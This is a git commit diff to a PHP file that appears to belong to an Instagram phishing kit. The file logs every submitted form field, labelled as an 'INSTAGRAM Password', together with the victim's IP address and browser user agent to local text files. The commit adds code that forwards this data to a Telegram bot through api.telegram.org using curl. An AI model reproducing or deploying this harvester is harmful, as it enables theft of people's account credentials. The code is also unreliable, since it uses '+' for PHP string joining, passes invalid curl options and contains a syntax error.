4f38833430487d80a528cb9a6a4217035b6d27bc
Harsh Singhvi <harshsinghvi98@gmail.com>
2020-06-29 12:40:28 +0530

    tg bot send message debug mode

--- src/instagram.php
+++ src/instagram.php
@@ -3,7 +3,7 @@ $date = new DateTime("now", new DateTimeZone('Asia/Kolkata'));
 $date = $date->format("y:m:d h:i:s");
 $raw = fopen('raw.txt', 'a+');
 $template=fopen('instagram.txt','a+');
-
+$message="INSTAGRAM Password at " + $date +"%0A";
 fwrite($raw, $date);
 fwrite($raw, "\n ");
 fwrite($template, $date);
@@ -19,6 +19,8 @@ foreach($_POST as $variable => $value) {
    fwrite($template, "=");
    fwrite($template, $value);
    fwrite($template, "\r\n");
+
+   $message += $variable + "=" + $value +"%0A" ;
 }
 
 
@@ -38,19 +40,36 @@ $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT']."\r\n";
 $victim = "IP: ";
 
+
+$message += $victim +"%0A" + $browser +"%0A" +$useragent +"%0A" +"%0A":
 $tgbot = getenv('TGBOT', true) ?: getenv('TGBOT');
 $tgchat = getenv('TGCHAT', true) ?: getenv('TGCHAT');
+$url = 'http://api.telegram.org/bot'+$tgbot+'/sendMessage';
+$ch = curl_init($url);
+curl_setopt($ch, chat_id, $tgchat);
+curl_setopt($ch, text, $message);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+
+
 
 fwrite($raw, $victim);
 fwrite($raw, $ipaddress);
 fwrite($raw, $useragent);
 fwrite($raw, $browser);
+
+fwrite($raw, "\r\n");
+fwrite($raw, "\r\n");
+
 fwrite($raw, $tgbot);
 fwrite($raw, "\r\n");
 fwrite($raw, $tgchat);
-
-
-
+fwrite($raw, "\r\n");
+fwrite($raw, "tg message \r\n");
+fwrite($raw, $message);
+fwrite($raw, "\r\n");
+fwrite($raw, "\r\n");
+fwrite($raw, $response);
 
 fwrite($template, $victim);
 fwrite($template, $ipaddress);
